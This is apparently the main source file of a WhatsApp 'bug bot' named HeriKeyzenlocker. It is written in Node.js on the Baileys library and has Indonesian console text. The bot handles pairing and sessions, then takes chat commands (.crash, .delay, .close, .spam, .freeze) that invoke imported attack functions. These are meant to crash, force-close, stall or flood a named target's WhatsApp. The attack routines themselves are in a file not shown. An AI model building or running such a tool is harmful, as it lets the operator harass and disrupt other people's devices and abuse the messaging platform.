const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const P = require('pino');
const fs = require('fs');

const config = require('./config');
const { bugFunctions } = require('./functions/handler');

const logger = P({ level: 'silent' });

async function startBot() {
    try {
        const { version } = await fetchLatestBaileysVersion();
        console.log(`📱 Baileys Version: ${version.join('.')}`);
        
        const { state, saveCreds } = await useMultiFileAuthState('session');
        
        const sock = makeWASocket({
            version: version,
            auth: state,
            printQRInTerminal: false,
            logger: logger,
            browser: ['HeriKeyzenlocker', 'Chrome', '120.0.0.0'],
            syncFullHistory: false,
            markOnlineOnConnect: true,
            generateHighQualityLinkPreview: false,
            defaultQueryTimeoutMs: 10000,
            keepAliveIntervalMs: 30000,
            connectTimeoutMs: 60000,
            patchMessageBeforeSending: (message) => {
                if (message?.buttonsMessage || message?.templateMessage || message?.listMessage) {
                    message = {
                        viewOnceMessage: {
                            message: {
                                messageContextInfo: {
                                    deviceListMetadata: {},
                                    deviceListMetadataVersion: 2
                                },
                                ...message
                            }
                        }
                    };
                }
                return message;
            }
        });
        
        if (config.USE_PAIRING_CODE) {
            let phoneNumber = config.PAIRING_PHONE_NUMBER.replace(/[^0-9]/g, '');
            
            if (!phoneNumber || phoneNumber.length < 10) {
                console.log('❌ ERROR: Nomor HP tidak valid! Edit src/config.js');
                process.exit(1);
            }
            
            if (!phoneNumber.startsWith('62')) {
                phoneNumber = phoneNumber.startsWith('0') ? '62' + phoneNumber.substring(1) : '62' + phoneNumber;
            }
            
            const pairingJid = phoneNumber + '@s.whatsapp.net';
            console.log(`🔐 Generating pairing code for: ${pairingJid}`);
            
            try {
                const code = await sock.requestPairingCode(pairingJid);
                
                console.log('\n╔════════════════════════════════════════════════╗');
                console.log('║     🔐 HERIKEYZENLOCKER PAIRING CODE 🔐        ║');
                console.log('╠════════════════════════════════════════════════╣');
                console.log(`║  CODE: ${code}`);
                console.log('╠════════════════════════════════════════════════╣');
                console.log('║  1. Buka WhatsApp > 3 titik                   ║');
                console.log('║  2. Perangkat Tertaut > Tautkan Perangkat     ║');
                console.log('║  3. Masukkan kode di atas                     ║');
                console.log('╚════════════════════════════════════════════════╝\n');
                
                fs.writeFileSync('pairing_code.txt', 
                    `═══════════════════════════════════════\n` +
                    `HERIKEYZENLOCKER WA BOT - PAIRING CODE\n` +
                    `═══════════════════════════════════════\n` +
                    `Code: ${code}\n` +
                    `Phone: ${pairingJid}\n` +
                    `Time: ${new Date().toLocaleString('id-ID')}\n` +
                    `Owner: ${config.OWNER_NAME}\n` +
                    `Origin: ${config.OWNER_ORIGIN}\n` +
                    `═══════════════════════════════════════\n`
                );
            } catch (pairingError) {
                console.log('❌ Pairing error:', pairingError.message);
                setTimeout(startBot, 5000);
                return;
            }
        }
        
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'close') {
                const statusCode = (lastDisconnect.error instanceof Boom) 
                    ? lastDisconnect.error.output?.statusCode 
                    : 500;
                
                if (statusCode === DisconnectReason.loggedOut) {
                    console.log('❌ Session expired! Delete "session" folder');
                } else if (config.AUTO_RECONNECT) {
                    console.log('🔄 Reconnecting...');
                    setTimeout(startBot, 5000);
                }
            } 
            else if (connection === 'open') {
                console.log('\n✅ HERIKEYZENLOCKER BOT ONLINE!');
                console.log(`👑 Owner: ${config.OWNER_NAME}`);
                console.log(`📍 From: ${config.OWNER_ORIGIN}`);
                console.log(`🎂 Born: ${config.OWNER_BIRTH}\n`);
            }
        });
        
        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('messages.upsert', async ({ messages, type }) => {
            if (type !== 'notify') return;
            
            for (const msg of messages) {
                if (!msg.message) continue;
                
                const from = msg.key.remoteJid;
                const text = msg.message?.conversation || 
                            msg.message?.extendedTextMessage?.text || '';
                
                if (!text) continue;
                
                const command = text.toLowerCase().split(' ')[0];
                const args = text.split(' ').slice(1);
                
                switch(command) {
                    case '.crash':
                        if (args[0]) {
                            await bugFunctions.crashUi(sock, args[0]);
                            await sock.sendMessage(from, { text: `💀 CRASH: ${args[0]}` });
                        }
                        break;
                    case '.delay':
                        if (args[0]) {
                            const time = parseInt(args[1]) || 5000;
                            await bugFunctions.delayHard(sock, args[0], time);
                            await sock.sendMessage(from, { text: `⏰ DELAY: ${time}ms` });
                        }
                        break;
                    case '.close':
                        if (args[0]) {
                            await bugFunctions.forclose(sock, args[0]);
                            await sock.sendMessage(from, { text: `🔒 CLOSE: ${args[0]}` });
                        }
                        break;
                    case '.spam':
                        if (args[0]) {
                            const count = parseInt(args[1]) || 10;
                            await bugFunctions.spamMessage(sock, args[0], count);
                        }
                        break;
                    case '.freeze':
                        await bugFunctions.freezeConnection(sock);
                        await sock.sendMessage(from, { text: '❄️ FREEZE' });
                        break;
                    case '.info':
                        await sock.sendMessage(from, { 
                            text: `╔════════════════════════════╗
║  HERIKEYZENLOCKER BOT   ║
╠════════════════════════════╣
║ 👑 Owner: ${config.OWNER_NAME}
║ 📍 Origin: ${config.OWNER_ORIGIN}
║ 🎂 Born: ${config.OWNER_BIRTH}
╠════════════════════════════╣
║ 🔥 COMMANDS:
║ • .crash [target]
║ • .delay [target] [ms]
║ • .close [target]
║ • .spam [target] [count]
║ • .freeze
╚════════════════════════════╝`
                        });
                        break;
                }
            }
        });
        
        return sock;
        
    } catch (error) {
        console.error('❌ Error:', error.message);
        setTimeout(startBot, 10000);
    }
}

console.log('\n╔══════════════════════════════════════╗');
console.log('║  HERIKEYZENLOCKER WA BOT v5.0     ║');
console.log('║  FROM BANJARAN SUDOM              ║');
console.log('║  🔐 PAIRING CODE MODE             ║');
console.log('╚══════════════════════════════════════╝\n');

startBot();
